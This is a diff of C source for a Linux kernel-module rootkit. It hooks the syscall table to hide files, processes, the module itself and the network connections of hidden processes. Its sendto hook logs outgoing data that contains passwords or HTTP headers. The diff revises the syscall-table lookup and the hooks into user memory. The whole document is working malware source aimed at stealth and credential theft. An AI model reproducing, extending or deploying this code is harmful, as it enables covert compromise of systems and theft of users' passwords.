@@ -13,17 +13,19 @@
 #include <linux/fs_struct.h>	//for xchg(&current->fs->umask, ... )
 #include <asm/cacheflush.h>
 
-#define BEGIN_BUF_SIZE 10000
-#define LOG_SEPARATOR "\n.............................................................\n"
-#define CMDLINE_SIZE 1000
-#define MAX_DIRENT_READ 10000
-
 //configuration
 #define FILE_SUFFIX ".rootkit"		//hiding files with names ending on defined suffix
 #define COMMAND_CONTAINS ".//./"	//hiding processes which cmdline contains defined text
 #define ROOTKIT_NAME "rootkit"		//you need to type here name of this module to make this module hidden
 #define SYSCALL_MODIFY_METHOD PAGE_RW   //method of making syscall table writeable, CR0 or PAGE_RW
 #define UNABLE_TO_UNLOAD 0
+//end of configuration
+
+
+#define BEGIN_BUF_SIZE 10000
+#define LOG_SEPARATOR "\n.............................................................\n"
+#define CMDLINE_SIZE 1000
+#define MAX_DIRENT_READ 10000
 
 
 #define CR0 0
@@ -34,19 +36,19 @@
 DEFINE_MUTEX(log_mutex_pass);
 DEFINE_MUTEX(log_mutex_http);
 
+#define EMBEDDED_NAME_MAX	(PATH_MAX - offsetof(struct filename, iname))
+
 struct linux_dirent {
 	unsigned long d_ino;
 	unsigned long d_off;
 	unsigned short d_reclen;
-	char d_name[];
+	char d_name[1];
 };
 
 
-unsigned long **sys_call_table;
+unsigned long **sys_call_table_;
 unsigned long original_cr0;
 
-asmlinkage long (*ref_sys_read) (unsigned int fd, char __user * buf,
-    size_t count);
 asmlinkage long (*ref_sys_getdents) (unsigned int,
     struct linux_dirent __user *, unsigned int);
 asmlinkage long (*ref_sys_getdents64) (unsigned int,
@@ -55,8 +57,6 @@ asmlinkage long (*ref_sys_sendto) (int, void __user *, size_t, unsigned,
     struct sockaddr __user *, int);
 asmlinkage long (*ref_sys_open) (const char __user * filename,
     int flags, umode_t mode);
-asmlinkage long (*ref_sys_stat) (const char __user * filename,
-    struct __old_kernel_stat __user * statbuf);
 asmlinkage long (*ref_sys_readlink) (const char __user * path,
     char __user * buf, int bufsiz);
 
@@ -68,7 +68,7 @@ struct file *file_open(const char *path, int flags, int rights)
 	mm_segment_t oldfs;
 	int err = 0;
 
-        oldfs = get_fs();
+    oldfs = get_fs();
 	set_fs(get_ds());
 
 	filp = filp_open(path, flags, rights);
@@ -124,8 +124,9 @@ int file_sync(struct file *file)
 
 /*end of functions for r/w files copied from stackoverflow*/
 
-/* 2 below functions are from https://d0hnuts.com/2016/12/21/basics-of-making-a-rootkit-from-syscall-to-hook/#phide */
-//Make syscall table  writeable
+
+/* 2 functions below are copied from https://d0hnuts.com/2016/12/21/basics-of-making-a-rootkit-from-syscall-to-hook/#phide */
+//Make an address writeable
 int make_rw(unsigned long address){
  
         unsigned int level;
@@ -136,7 +137,7 @@ int make_rw(unsigned long address){
         return 0;
 }
  
-// Make the syscall table  write protected
+// //Make an address writeable write protected
 int make_ro(unsigned long address){
  
         unsigned int level;
@@ -196,13 +197,6 @@ char *read_n_bytes_of_file(struct file *f, int n, int *return_read)
 	return buf;
 }
 
-asmlinkage long new_sys_read(unsigned int fd, char __user * buf, size_t count)
-{
-	long ret;
-	ret = ref_sys_read(fd, buf, count);
-
-	return ret;
-}
 
 int check_file_suffix(const char *name)	//checks if file ends on suffix
 {
@@ -298,76 +292,144 @@ int should_be_hidden(const char *name)
 asmlinkage long new_sys_getdents(unsigned int fd,
     struct linux_dirent __user * dirent, unsigned int count)
 {
-	long read;
+	long size;
+    long new_size;
+    long ret;
 	long bpos;
-	struct linux_dirent __user *d;
-	read = ref_sys_getdents(fd, dirent, count);
-	if (read <= 0)
-		return read;
-	for (bpos = 0; bpos < read;) {
-		d = (struct linux_dirent __user *)((char *)dirent + bpos);
+	struct linux_dirent *d;
+    struct linux_dirent *fake_dirent = NULL;
+    
+    
+	size = ref_sys_getdents(fd, dirent, count);
+	if (size <= 0)
+    {
+		ret = size;
+        goto end;
+    }
+    
+       
+    fake_dirent = kmalloc(size, GFP_KERNEL);
+    if (fake_dirent == NULL)
+    {
+        ret = size;
+        goto end;
+    }
+    
+    if(copy_from_user(fake_dirent, dirent, size))
+    {
+        ret = size;
+        goto end;
+    }
+       
+    new_size = size; 
+	for (bpos = 0; bpos < size;) {
+		d = (struct linux_dirent *)((char *)fake_dirent + bpos);
 		if (d->d_ino != 0) {
 			if (should_be_hidden((char *)d->d_name)) {
 				//delete this entry
-				int rest = read - (bpos + d->d_reclen);
+				int rest = new_size - (bpos + d->d_reclen);
 				int from_ = bpos + d->d_reclen;
 				int to_ = bpos;
 
-				struct linux_dirent __user *from =
-				    (struct linux_dirent __user *)((char *)
-				    dirent + from_);
-				struct linux_dirent __user *to =
-				    (struct linux_dirent __user *)((char *)
-				    dirent + to_);
+				struct linux_dirent *from =
+				    (struct linux_dirent *)((char *)
+				    fake_dirent + from_);
+				struct linux_dirent *to =
+				    (struct linux_dirent *)((char *)
+				    fake_dirent + to_);
 
 				memcpy(to, from, rest);
-				read -= d->d_reclen;
+				new_size -= d->d_reclen;
 				continue;
 			}
 		}
 		bpos += d->d_reclen;
 	}
 
-	//printk(KERN_DEBUG "getdents end\n");
-	return read;
+    if(copy_to_user(dirent, fake_dirent, new_size))
+    {
+        ret = -1;
+        goto end;
+    }
+    
+    ret = new_size;
+    
+end:
+    if(fake_dirent)
+      kfree(fake_dirent);
+        
+	return ret;
 }
 
 asmlinkage long new_sys_getdents64(unsigned int fd,
     struct linux_dirent64 __user * dirent, unsigned int count)
 {
-	//printk(KERN_INFO "getdents64 start\n");
-	long read;
+	long size;
+    long new_size;
+    long ret;
 	long bpos;
-	struct linux_dirent64 __user *d;
-	read = ref_sys_getdents64(fd, dirent, count);
-	if (read <= 0)
-		return read;
-	for (bpos = 0; bpos < read;) {
-		d = (struct linux_dirent64 __user *)((char *)dirent + bpos);
+	struct linux_dirent64 *d;
+    struct linux_dirent64 *fake_dirent = NULL;
+    
+	size = ref_sys_getdents64(fd, dirent, count);
+	if (size <= 0)
+    {
+        ret = size;
+		goto end;
+    }
+	
+    fake_dirent = kmalloc(size, GFP_KERNEL);
+    if(fake_dirent == NULL)
+    {
+        ret = size;
+        goto end;
+    }
+    
+    if(copy_from_user(fake_dirent, dirent, size))
+    {
+        ret = size;
+        goto end;
+    }
+    
+    new_size = size;
+    for (bpos = 0; bpos < new_size;) {
+		d = (struct linux_dirent64 *)((char *)fake_dirent + bpos);
 		if (d->d_ino != 0) {
 			if (should_be_hidden((char *)d->d_name)) {
 				//delete this entry
-				int rest = read - (bpos + d->d_reclen);
+				int rest = new_size - (bpos + d->d_reclen);
 				int from_ = bpos + d->d_reclen;
 				int to_ = bpos;
 
-				struct linux_dirent64 __user *from =
-				    (struct linux_dirent64 __user *)((char *)
-				    dirent + from_);
-				struct linux_dirent64 __user *to =
-				    (struct linux_dirent64 __user *)((char *)
-				    dirent + to_);
+				struct linux_dirent64 *from =
+				    (struct linux_dirent64 *)((char *)
+				    fake_dirent + from_);
+				struct linux_dirent64 *to =
+				    (struct linux_dirent64 *)((char *)
+				    fake_dirent + to_);
 
 				memcpy(to, from, rest);
-				read -= d->d_reclen;
+				new_size -= d->d_reclen;
 				continue;
 			}
 		}
 		bpos += d->d_reclen;
 	}
 
-	//printk(KERN_DEBUG "getdents64 end\n");
-	return read;
+    if(copy_to_user(dirent, fake_dirent, new_size))
+    {
+        ret = -1;
+        goto end;
+    }
+    
+    ret = new_size;
+    
+    
+end:
+    if(fake_dirent)
+      kfree(fake_dirent);
+    
+	return ret;
 }
 
 void save_to_log(const char *log_type, const char *what, size_t size)
@@ -396,7 +458,7 @@ void save_to_log(const char *log_type, const char *what, size_t size)
 		goto end;
 
 	kern_path(full_path, 0, &p);
-	err = vfs_getattr(&p, &ks);
+	err = vfs_getattr(&p, &ks, 0xFFFFFFFF, 0);
 	if (err)
 		goto end;
 
@@ -440,10 +502,18 @@ int http_header_found(const char *buf, size_t size)
 	return 0;
 }
 
-asmlinkage long new_sys_sendto(int fd, void __user * buff, size_t len,
+asmlinkage long new_sys_sendto(int fd, void __user * buff_user, size_t len,
     unsigned int flags, struct sockaddr __user * addr, int addr_len)
 {
-	long ret;
+    
+    char *buff = kmalloc(len, GFP_KERNEL);
+    if (buff == NULL)
+        goto end;
+        
+    if(copy_from_user(buff, buff_user, len))
+      goto end;
+    
+    
 	if (password_found(buff, len)) {
 		printk(KERN_INFO "password found\n");
 		mutex_lock(&log_mutex_pass);
@@ -457,15 +527,17 @@ asmlinkage long new_sys_sendto(int fd, void __user * buff, size_t len,
 		save_to_log("http_requests", buff, len);
 		mutex_unlock(&log_mutex_http);
 	}
+    
+end:
+    if(buff)
+      kfree(buff);
 
-	ret = ref_sys_sendto(fd, buff, len, flags, addr, addr_len);
-
-	return ret;
+	return ref_sys_sendto(fd, buff_user, len, flags, addr, addr_len);
 }
 
 struct inode_list{
-  long inode;
-  struct inode_list *next;
+    long inode;
+    struct inode_list *next;
 };
 
 struct inode_list *first_inode;
@@ -582,8 +654,8 @@ int load_inodes_of_process(const char *name)
 			    long inode;
 
 			    snprintf(line, sizeof(line), "%s/%s", path,d->d_name);
-			    lnamelen=ref_sys_readlink(line,lname,sizeof(lname)-1);
-			    if(lnamelen==-1)
+			    lnamelen=ref_sys_readlink(line, lname, sizeof(lname)-1);
+			    if(lnamelen == -1)
 			    {
 			      bpos += d->d_reclen;
 			      continue;
@@ -655,20 +727,32 @@ char*   next_column(char *ptr)
 	return ptr;
 }
 
+
 //when open("/proc/modules") is called, reate fake file with removed rootkit entry and redirect to this file
 //also remove entries from /proc/net/tcp etc. of hidden processes
-asmlinkage long new_sys_open(char __user * filename, int flags, umode_t mode)
+asmlinkage long new_sys_open(char __user * filename_user, int flags, umode_t mode)
 {
 	long ret;
+    int filename_len;
+    char *filename = NULL;
 	int rootkit_path_len=strlen("/sys/module/")+strlen(ROOTKIT_NAME);
 	char *rootkit_path=kmalloc(rootkit_path_len+1,GFP_KERNEL);
 	if(!rootkit_path)
-	{
-	  ret=-1;
-	  goto end;
-	}
-	strcpy(rootkit_path,"/sys/module/");
-	strcat(rootkit_path,ROOTKIT_NAME);
+        goto call_ref_sys_open;
+        
+	strcpy(rootkit_path, "/sys/module/");
+	strcat(rootkit_path, ROOTKIT_NAME);
+    
+    filename_len = strnlen_user(filename_user, EMBEDDED_NAME_MAX);
+    
+    filename = kmalloc(filename_len+1, GFP_KERNEL);
+    if (filename == NULL)
+        goto call_ref_sys_open;
+    
+    if(copy_from_user(filename, filename_user, filename_len))
+        goto call_ref_sys_open;
+    filename[filename_len] = '\x00'; 
+    
 	if (strcmp(filename, "/proc/modules") == 0) {
 		struct file *fake_modules=NULL;
 		struct file *real_modules=NULL;
@@ -744,16 +828,17 @@ end1:
 		    set_fs(old_fs);
 		}
 		kfree(new_path);
+        
 #if UNABLE_TO_UNLOAD
-	} else if (strncmp(filename, rootkit_path, rootkit_path_len) == 0) { //for unable to unload rootkit
+	} else if (strncmp(filename, rootkit_path, rootkit_path_len) == 0) {
 		ret=-ENOENT;
 #endif
 	} else if (strcmp(filename, "/proc/net/tcp") == 0) {
-		struct file *fake_net=NULL;
-		struct file *real_net=NULL;
+		struct file *fake_net = NULL;
+		struct file *real_net = NULL;
 		mm_segment_t old_fs;
-		char *net_buf=NULL;
-		char *new_path=NULL;
+		char *net_buf = NULL;
+		char *new_path = NULL;
 		long res;
 		int err=0;
 		char *line_ptr;
@@ -858,55 +943,42 @@ end2:
 		}
 
 		kfree(new_path);
-	} else {
-		ret = ref_sys_open(filename, flags, mode);
 	}
+    else {
+		goto call_ref_sys_open;
+	}
+    
+
 end:
+    if(filename)
+        kfree(filename);
+    
+    if(rootkit_path)
         kfree(rootkit_path);
-	return ret;
+	
+    return ret;
+call_ref_sys_open:
+    ret = ref_sys_open(filename_user, flags, mode);
+    goto end;
 }
 
-//for unable to unload rootkit
-asmlinkage long new_sys_stat (const char __user * filename,
-        struct __old_kernel_stat __user * statbuf)
+
+//explanation: https://bbs.archlinux.org/viewtopic.php?id=139406
+static unsigned long **acquire_sys_call_table(void)
 {
-#if UNABLE_TO_UNLOAD
-	long ret;
-	int rootkit_path_len=strlen("/sys/module/")+strlen(ROOTKIT_NAME);
-	char *rootkit_path=kmalloc(rootkit_path_len+1,GFP_KERNEL);
-	if(!rootkit_path){
-	  ret = ref_sys_stat(filename, statbuf);
-	  goto end;
-	}
-
-	strcpy(rootkit_path,"/sys/module/");
-	strcat(rootkit_path,ROOTKIT_NAME);
-	if (strncmp(filename, rootkit_path, rootkit_path_len) == 0) {
-		ret = -ENOENT;
-	} else {
-		ret = ref_sys_stat(filename, statbuf);
-	}
-end:
-	kfree(rootkit_path);
-// 	return ret;
-#else
-	return ref_sys_stat(filename, statbuf);
-#endif
-}
-
-//from https://bbs.archlinux.org/viewtopic.php?id=139406
-
-static unsigned long **aquire_sys_call_table(void)
-{
-	unsigned long int offset = PAGE_OFFSET;
+	unsigned long int offset = (unsigned long int) sys_close;
 	unsigned long **sct;
+    
+    printk(KERN_DEBUG "finding syscall table from: %p\n", (void*)offset);
 
 	while (offset < ULLONG_MAX) {
 		sct = (unsigned long **)offset;
 
 		if (sct[__NR_close] == (unsigned long *)sys_close)
+        {
+            printk(KERN_DEBUG "sys call table found: %p\n", (void*)sct);
 			return sct;
-
+        }
 		offset += sizeof(void *);
 	}
 
@@ -952,40 +1024,42 @@ static void create_files(void)
 }
 
 #define register(name) \
- ref_sys_##name = (void *)sys_call_table[__NR_##name]; \
- sys_call_table[__NR_##name] = (unsigned long *)new_sys_##name;
+ ref_sys_##name = (void *)sys_call_table_[__NR_##name]; \
+ sys_call_table_[__NR_##name] = (unsigned long *)new_sys_##name;
 
 #define unregister(name) \
- sys_call_table[__NR_##name] = (unsigned long *)ref_sys_##name;
+ sys_call_table_[__NR_##name] = (unsigned long *)ref_sys_##name;
 
 static int __init rootkit_start(void)
-{
-	if (!(sys_call_table = aquire_sys_call_table()))
-		return -1;
-
+{       
+	if (!(sys_call_table_ = acquire_sys_call_table()))
+		return 0;
+        
 	create_files();
 	
-	ref_sys_readlink = (void *)sys_call_table[__NR_readlink];
+	ref_sys_readlink = (void *)sys_call_table_[__NR_readlink];
 
+    
 #if SYSCALL_MODIFY_METHOD==CR0
 	original_cr0 = read_cr0();
 	write_cr0(original_cr0 & ~0x00010000);
 #endif
 #if SYSCALL_MODIFY_METHOD==PAGE_RW
-	make_rw((long unsigned int)sys_call_table);
+	make_rw((long unsigned int)sys_call_table_);
 #endif
 
+    
 	register (getdents);
 	register (getdents64);
 	register (sendto);
 	register (open);
-	register (stat);
+
 
 #if SYSCALL_MODIFY_METHOD==CR0
 	write_cr0(original_cr0);
 #endif
 #if SYSCALL_MODIFY_METHOD==PAGE_RW
-	make_ro((long unsigned int)sys_call_table);
+	make_ro((long unsigned int)sys_call_table_);
 #endif
 
 	return 0;
@@ -993,7 +1067,8 @@ static int __init rootkit_start(void)
 
 static void __exit rootkit_end(void)
 {
-	if (!sys_call_table) {
+    
+	if (!sys_call_table_) {
 		return;
 	}
 
@@ -1001,23 +1076,24 @@ static void __exit rootkit_end(void)
 	write_cr0(original_cr0 & ~0x00010000);
 #endif
 #if SYSCALL_MODIFY_METHOD==PAGE_RW
-	make_rw((long unsigned int)sys_call_table);
+	make_rw((long unsigned int)sys_call_table_);
 #endif
 
 	unregister(getdents);
 	unregister(getdents64);
 	unregister(sendto);
 	unregister(open);
-	unregister(stat);
 
 #if SYSCALL_MODIFY_METHOD==CR0
 	write_cr0(original_cr0);
 #endif
 #if SYSCALL_MODIFY_METHOD==PAGE_RW
-	make_ro((long unsigned int)sys_call_table);
+	make_ro((long unsigned int)sys_call_table_);
 #endif
 
 	clean_hidden_inodes();
+    
+    
 }
 
 module_init(rootkit_start);
